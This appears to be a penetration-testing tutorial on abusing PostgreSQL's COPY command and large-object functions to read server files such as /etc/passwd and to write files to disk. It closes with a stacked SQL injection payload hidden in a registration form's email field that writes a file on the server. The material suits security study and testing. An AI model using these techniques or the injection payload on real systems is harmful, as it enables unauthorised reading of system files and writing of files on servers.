# Reading and Writing Files

## **Method 1: COPY**

- Built in [COPY](https://www.postgresql.org/docs/current/sql-copy.html) command
- Intended use of this command is to import/export tables
- File operations run on the system as the `postgres` user
    
    ### **Permissions**
    
    In order to use `COPY` to read/write files, the user must either have the [pg_read_server_files / pg_write_server_files](https://www.postgresql.org/docs/11/default-roles.html) role respectively, or be a superuser.
    
    ```java
    SELECT current_setting('is_superuser');
     current_setting 
    -----------------
     on
    (1 row)
    
    SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
     rolname  |        memberof        
    ----------+------------------------
     fileuser | {pg_read_server_files}
    (1 row)
    ```
    

### Reading Files

- Use the `COPY FROM` syntax to `copy` data from a file into a table in the database
1. Create a temporary table with one text column
2. Copy the contents of our target file into it 
3. Drop it after selecting the contents

```java
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE

bluebird=# COPY tmp FROM '/etc/passwd';
COPY 59

bluebird=# SELECT * FROM tmp LIMIT 5;
                        t                        
-------------------------------------------------
 root:x:0:0:root:/root:/usr/bin/zsh
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
(5 rows)

bluebird=# DROP TABLE tmp;
DROP TABLE
```

One issue with using `COPY` to read files, is that it expects data to be seperated into columns. By default it treats `\t` as a column, so if you try to read a file like `/etc/hosts` you will run into this error.

```java
COPY tmp FROM '/etc/hosts';
ERROR:  extra data after last expected column
CONTEXT:  COPY tmp, line 1: "127.0.0.1  localhost"
```

Unfortunately there is no perfect solution to getting around this, but what we can do is change the `delimiter` from `\t` to some character that is unlikely to appear in the data like this:

```java
bluebird=# COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
COPY 7
bluebird=# SELECT * FROM tmp;
                             t                              
------------------------------------------------------------
 127.0.0.1       localhost
 127.0.1.1       kali
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
(7 rows)
```

### Writing Files

- Writing files using `COPY` works very similarly- instead of `COPY FROM` we will use `COPY TO`
- Use a temporary table to avoid leaving traces behind
- Since all data is put into one column, there is no issue with delimiters when it comes to writing files

```java
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE

bluebird=# INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
INSERT 0 1

bluebird=# COPY tmp TO '/tmp/proof.txt';
COPY 1

bluebird=# DROP TABLE tmp;
DROP TABLE

bluebird=# exit

$ cat /tmp/proof.txt 
To hack, or not to hack, that is the question
```

## **Method 2: Large Objects**

- [Large objects](https://www.postgresql.org/docs/current/largeobjects.html)

### **Reading Files**

- To read a file, we should first use `lo_import` to load the file into a new `large object`
    - Returns the `object ID` of the large object which we will need to reference later once the file is imported

```java
SELECT lo_import('/etc/passwd');
 lo_import 
-----------
     16513
(1 row)
```

- The file will be stored in the `pg_largeobjects` table as a hexstring
- If the size of the file is larger than `2kB`, the `large object` will be split up into `pages` each `2kB` large (`4096` characters when hex encoded)
- We can get the contents with `lo_get(<object id>)`:

```java
SELECT lo_get(16513);
<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>
```

- Alternatively, you can select data directly from `pg_largeobject`, but this requires specifying the page numbers as well

```java
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;
<SNIP>
```

- Once we've obtained the hexstring, we can convert it back using `xxd`

```java
echo 726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
<SNIP>
```

<aside>
⚠️ Unfortunately, it's not possible to specify an `object ID` when creating the large object, so it does make things harder if you are doing this blindl. One thing you could do is select all `object IDs` from the `pg_largeobject` table and figure out which one is yours.

</aside>

```java
SELECT DISTINCT loid FROM pg_largeobject;
 loid  
-------
 16515
(1 row)
```

### Writing Files

- Essentially we will create a large object, insert hex-encoded data `2kb` at a time and then export the large object to a file on disk

```java
$split -b 2048 /etc/passwd

$ ls -l
total 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab
```

```java
xxd -ps -c 99999999999 xaa
726f6f743a783a303a303a726<SNIP>
```

Once that's ready, we can create a `large object` with a known `object ID` with `lo_create`, then insert the hex-encoded data one page at a time into `pg_largeobject`, export the `large object` by `object ID` to a specifiy path with `lo_export` and then finally delete the object from the database with `lo_unlink`.

```java
bluebird=# SELECT lo_create(31337);
 lo_create 
-----------
     31337
(1 row)

bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
INSERT 0 1
bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));
INSERT 0 1
bluebird=# SELECT lo_export(31337, '/tmp/passwd');
 lo_export 
-----------
         1$
(1 row)

bluebird=# SELECT lo_unlink(31337);
 lo_unlink 
-----------
         1
(1 row)

bluebird=# exit

$ head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

<aside>
⚠️ Depending on user permissions, the `INSERT` queries may fail. In that case you could try using `lo_put` as it is described in the [documentation](https://www.postgresql.org/docs/current/lo-funcs.html):

</aside>

```java
SELECT lo_put(31337, 0, 'this is a test');
 lo_put 
--------
 
(1 row)
```

### Permissions

Any user can create or unlink large objects, but importing, exporting or updating the values require the user to either be a superuser, or to have explicit permissions granted. You may read more about this [here](https://www.postgresql.org/docs/current/lo-interfaces.html).

# Example

```java
name=max
&username=lfygame
&email=x%40x.com','$2a$12$efjEctOv03rB.oskhPzRaO1fJZvBCGXY46nDUkhnwiDwE7tcYTPB2')%3bCREATE+TABLE+tmp+(t+TEXT)%3bINSERT+INTO+tmp+VALUES+('poc')%3bCOPY+tmp+TO+'/var/lib/postgresql/proof.txt'%3bDROP+TABLE+tmp%3b--&password=x&repeatPassword=x
```

```java
email=x@x.com','$2a$12$efjEctOv03rB.oskhPzRaO1fJZvBCGXY46nDUkhnwiDwE7tcYTPB2')
;CREATE TABLE tmp (t TEXT)
;INSERT INTO tmp VALUES ('poc')
;COPY tmp TO '/var/lib/postgresql/proof.txt'
;DROP TABLE tmp;--
```